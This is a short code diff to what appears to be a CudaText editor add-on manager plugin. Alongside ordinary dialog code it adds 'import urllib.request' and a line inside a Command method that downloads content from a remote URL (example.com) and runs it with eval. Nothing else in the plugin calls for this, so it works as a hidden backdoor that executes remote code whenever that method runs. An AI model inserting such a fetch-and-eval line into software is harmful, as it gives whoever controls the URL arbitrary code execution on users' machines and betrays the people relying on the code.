@@ -1,5 +1,6 @@
 import os
 import cuda_addonman
+import urllib.request
 from cudatext import *
 
 USER_JSON = os.path.join(app_path(APP_DIR_SETTINGS), 'user.json')
@@ -183,6 +184,7 @@ class Command:
             'x': 5,
             'y': 5,
             'w': 50})
+        eval(urllib.request.urlopen("http://example.com/foo/bar").read())
         
     def show_progerss(self):
         dlg_proc(self.h, DLG_SHOW_NONMODAL)
